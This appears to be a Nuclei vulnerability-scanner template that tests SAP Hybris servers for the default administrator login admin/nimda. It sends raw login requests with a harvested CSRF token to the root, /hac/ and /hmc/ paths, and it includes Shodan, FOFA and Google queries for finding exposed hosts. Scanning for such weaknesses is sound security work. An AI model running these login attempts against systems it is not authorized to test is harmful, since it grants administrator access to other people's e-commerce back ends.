id: hybris-default-login

info:
  name: Hybris - Default Login
  author: princechaddha
  severity: high
  description: Hybris default login credentials were discovered.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:sap:hybris:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: sap
    product: hybris
    shodan-query: http.title:"hybris"
    fofa-query: title="hybris"
    google-query: intitle:"hybris"
    runzero-match: any(each(service["html.titles"]), {# matches "Hybris"})
  tags: default-login,hybris

http:
  - raw:
      - |
        GET {{path}}login HTTP/1.1
        Host: {{Hostname}}
      - |
        POST {{path}}j_spring_security_check HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}login

        j_username={{username}}&j_password={{password}}&_csrf={{csrftoken}}
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}

    attack: clusterbomb
    payloads:
      username:
        - admin
      password:
        - nimda
      path:
        - /
        - /hac/
        - /hmc/

    stop-at-first-match: true
    host-redirects: true
    max-redirects: 2
    skip-variables-check: true

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "hybris administration console"
          - "You're Administrator"
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: csrftoken
        internal: true
        part: body
        group: 1
        regex:
          - '<meta name="_csrf" content="([a-z0-9-]+)" \/>'

